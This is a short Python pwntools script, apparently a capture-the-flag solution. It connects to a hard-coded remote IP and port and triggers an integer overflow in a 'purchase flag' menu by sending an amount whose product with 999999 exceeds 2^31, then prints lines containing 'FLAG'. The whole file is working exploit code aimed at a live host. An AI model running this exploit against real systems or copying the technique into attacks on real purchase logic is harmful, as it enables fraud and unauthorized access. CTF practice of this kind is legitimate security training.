from pwn import *

# Connect to the server
r = remote('140.113.24.241', 30170)

r.sendline(b'1')  # Purchase flag
r.sendline(b'2147484') # amount, 2147484 * 999999 is greater than 2^31
r.sendline(b'2')  # Exit

# Receive the response and split it into lines
response = r.recvall().decode("utf-8", "ignore").strip()
lines = response.splitlines()

# Print only the lines that contain 'FLAG'
for line in lines:
    if 'FLAG' in line:
        print(line)

